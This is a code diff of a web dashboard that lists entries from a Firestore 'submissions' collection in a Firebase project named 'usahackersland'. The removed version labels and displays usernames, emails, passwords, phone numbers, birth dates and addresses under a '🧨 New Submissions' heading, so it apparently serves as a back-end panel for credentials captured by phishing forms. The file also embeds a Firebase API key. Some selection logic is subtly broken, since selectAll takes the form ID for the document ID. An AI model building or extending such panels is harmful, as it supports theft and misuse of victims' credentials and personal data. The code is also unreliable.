@@ -2,43 +2,49 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Dashboard</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>📊 Submissions Dashboard</title>
 <style>
-body{font-family: Arial, sans-serif;background:#0d1117;color:#e6edf3;padding:20px;}
-.card{background:#161b22;border-radius:8px;padding:16px;max-width:900px;margin:auto;box-shadow:0 0 10px rgba(0,0,0,0.4);}
-h2{color:#ff4d4d;margin-bottom:14px;}
-.item{margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between;align-items:center;transition: background 0.5s;}
-.item.new{background:#1b2f4a;}
-.info{flex:1;}
-.label{font-weight:bold;color:#58a6ff;}
-.value{margin-left:10px;color:#c9d1d9;word-break:break-word;}
-.btns{display:flex;gap:6px;}
-button{padding:6px 10px;border:none;border-radius:6px;cursor:pointer;}
-button.copy{background:#2ea44f;color:#fff;}
-button.delete{background:#d73a49;color:#fff;}
-button.selectAll{background:#0366d6;color:#fff;margin-bottom:10px;}
-button.deleteAll{background:#6f42c1;color:#fff;margin-bottom:10px;}
-button.copySelected{background:#17a2b8;color:#fff;margin-bottom:10px;margin-left:5px;}
-input[type="checkbox"]{margin-right:6px;}
+body{font-family:Arial,sans-serif;background:#f4f6f8;padding:20px}
+.container{max-width:1000px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}
+h2{text-align:center}
+table{width:100%;border-collapse:collapse;margin-top:20px}
+th,td{border:1px solid #ccc;padding:10px;text-align:left}
+th{background:#1976d2;color:#fff}
+tr:nth-child(even){background:#f1f1f1}
+button{padding:6px 10px;margin:2px;border:none;border-radius:5px;cursor:pointer}
+button.copy{background:#4caf50;color:#fff}
+button.delete{background:#f44336;color:#fff}
+button.selectAll{background:#1976d2;color:#fff}
+button.deleteAll{background:#d32f2f;color:#fff}
 </style>
-</head>
-
-<body>
-<div class="card">
-  <h2>🧨 New Submissions</h2>
-  <div style="margin-bottom:10px;">
-    <button class="selectAll" onclick="selectAll()">Select All</button>
-    <button class="deleteAll" onclick="deleteAll()">Delete All</button>
-    <button class="copySelected" onclick="copySelected()">Copy Selected</button>
-  </div>
-  <div id="output"></div>
-</div>
-
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+</head>
+<body>
+<div class="container">
+<h2>📊 Form Submissions Dashboard</h2>
+<div>
+<button class="selectAll" onclick="selectAll()">Select All ✅</button>
+<button class="deleteAll" onclick="deleteSelected()">Delete Selected 🗑️</button>
+</div>
+<table>
+<thead>
+<tr>
+<th>Select</th>
+<th>Form ID</th>
+<th>Field Name</th>
+<th>Value</th>
+<th>Time</th>
+<th>Actions</th>
+</tr>
+</thead>
+<tbody id="submissionBody"></tbody>
+</table>
+</div>
+
 <script>
+const $ = id => document.getElementById(id);
 const firebaseConfig = {
   apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain: "usahackersland.firebaseapp.com",
@@ -46,119 +52,111 @@ const firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
-const output = document.getElementById("output");
 
-let selectedDocs = new Set();
-let existingDocs = new Set();
+let selected = new Set();
 
-const emojis = {
-  username: "💠",
-  email: "📧",
-  password: "🔑",
-  "Phone Number": "📞",
-  "Date of Birth": "🎂",
-  Address: "🏠",
-  default: "📝"
-};
+function renderTable(submissions){
+  const tbody = $("submissionBody");
+  tbody.innerHTML = "";
 
-function copyText(text){
-  navigator.clipboard.writeText(text).then(()=>alert("Copied!"));
-}
+  submissions.forEach(doc=>{
+    const data = doc.data();
+    const formId = data.formId;
+    const createdAt = new Date(data.createdAt).toLocaleString();
 
-function selectAll(){
-  const checkboxes = document.querySelectorAll("input[type='checkbox']");
-  checkboxes.forEach(cb=>{ 
-    cb.checked=true; 
-    selectedDocs.add(cb.dataset.id); 
-  });
-}
+    Object.entries(data.data).forEach(([field,value])=>{
+      const tr = document.createElement("tr");
 
-function copySelected(){
-  if(selectedDocs.size === 0){ alert("No submissions selected!"); return; }
-  let text="";
-  selectedDocs.forEach(id=>{
-    const div = document.querySelector(`input[data-id="${id}"]`).parentElement;
-    text += div.querySelector(".info").innerText + "\n-----------------\n";
-  });
-  navigator.clipboard.writeText(text).then(()=>alert("Copied all selected!"));
-}
-
-function deleteAll(){
-  if(confirm("Delete ALL submissions?")){
-    db.collection("submissions").get().then(snapshot=>{
-      snapshot.forEach(doc=>db.collection("submissions").doc(doc.id).delete());
-    });
-  }
-}
-
-// Listen for new submissions
-db.collection("submissions")
-  .orderBy("createdAt","desc")
-  .onSnapshot(snapshot=>{
-    snapshot.forEach(doc=>{
-      if(existingDocs.has(doc.id)) return;
-      existingDocs.add(doc.id);
-
-      const data = doc.data();
-      const div = document.createElement("div");
-      div.className = "item new";
-
+      const selectTd = document.createElement("td");
       const checkbox = document.createElement("input");
       checkbox.type = "checkbox";
-      checkbox.dataset.id = doc.id;
-      checkbox.onchange = ()=> {
-        if(checkbox.checked) selectedDocs.add(doc.id);
-        else selectedDocs.delete(doc.id);
+      checkbox.onchange = e=>{
+        if(e.target.checked) selected.add(doc.id+"_"+field);
+        else selected.delete(doc.id+"_"+field);
       };
+      selectTd.appendChild(checkbox);
+      tr.appendChild(selectTd);
 
-      const info = document.createElement("div");
-      info.className = "info";
+      const formTd = document.createElement("td");
+      formTd.textContent = formId;
+      tr.appendChild(formTd);
 
-      // Build display text with emojis like Telegram
-      let infoHTML = "";
-      if(data.username) infoHTML += `<div>${emojis.username} Username: <span class="value">${data.username}</span></div>`;
-      if(data.email) infoHTML += `<div>${emojis.email} Email: <span class="value">${data.email}</span></div>`;
-      if(data.password) infoHTML += `<div>${emojis.password} Password: <span class="value">${data.password}</span></div>`;
-      
-      // Extra fields
-      Object.entries(data).forEach(([k,v])=>{
-        if(["username","email","password","createdAt"].includes(k)) return;
-        const em = emojis[k] || emojis.default;
-        infoHTML += `<div>${em} ${k}: <span class="value">${v}</span></div>`;
-      });
+      const fieldTd = document.createElement("td");
+      fieldTd.textContent = field;
+      tr.appendChild(fieldTd);
 
-      // Submission time
-      infoHTML += `<div>⏰ Time: <span class="value">${data.createdAt ? new Date(data.createdAt).toLocaleString() : "—"}</span></div>`;
+      const valueTd = document.createElement("td");
+      valueTd.textContent = value;
+      tr.appendChild(valueTd);
 
-      info.innerHTML = infoHTML;
+      const timeTd = document.createElement("td");
+      timeTd.textContent = createdAt;
+      tr.appendChild(timeTd);
 
-      const btns = document.createElement("div");
-      btns.className = "btns";
+      const actionTd = document.createElement("td");
 
       const copyBtn = document.createElement("button");
+      copyBtn.textContent = "Copy 📋";
       copyBtn.className="copy";
-      copyBtn.textContent="Copy";
-      copyBtn.onclick = ()=>copyText(info.innerText);
+      copyBtn.onclick = ()=>navigator.clipboard.writeText(value);
+      actionTd.appendChild(copyBtn);
 
       const deleteBtn = document.createElement("button");
+      deleteBtn.textContent = "Delete 🗑️";
       deleteBtn.className="delete";
-      deleteBtn.textContent="Delete";
-      deleteBtn.onclick = ()=>{
-        if(confirm("Delete this submission?")) db.collection("submissions").doc(doc.id).delete();
-      };
+      deleteBtn.onclick = ()=>deleteField(doc.id, field);
+      actionTd.appendChild(deleteBtn);
 
-      btns.appendChild(copyBtn);
-      btns.appendChild(deleteBtn);
+      tr.appendChild(actionTd);
 
-      div.appendChild(checkbox);
-      div.appendChild(info);
-      div.appendChild(btns);
-
-      output.prepend(div);
-
-      setTimeout(()=>{ div.classList.remove("new"); }, 3000);
+      tbody.appendChild(tr);
     });
   });
+}
+
+// Delete single field
+function deleteField(docId, field){
+  const docRef = db.collection("submissions").doc(docId);
+  docRef.get().then(doc=>{
+    if(!doc.exists) return;
+    const data = doc.data().data;
+    delete data[field];
+    // if no fields left, delete doc
+    if(Object.keys(data).length===0){
+      docRef.delete();
+    } else {
+      docRef.update({data});
+    }
+  });
+}
+
+// Select all checkboxes
+function selectAll(){
+  document.querySelectorAll("tbody input[type=checkbox]").forEach(cb=>{
+    cb.checked=true;
+    const tr = cb.closest("tr");
+    const docId = tr.children[1].textContent;
+    const field = tr.children[2].textContent;
+    selected.add(docId+"_"+field);
+  });
+}
+
+// Delete all selected
+function deleteSelected(){
+  const arr = Array.from(selected);
+  arr.forEach(idField=>{
+    const [docId, field] = idField.split("_");
+    deleteField(docId, field);
+  });
+  selected.clear();
+}
+
+// Listen to submissions
+db.collection("submissions").orderBy("createdAt","desc").onSnapshot(snap=>{
+  const submissions = [];
+  snap.forEach(doc=>submissions.push(doc));
+  renderTable(submissions);
+});
 </script>
 </body>
 </html>
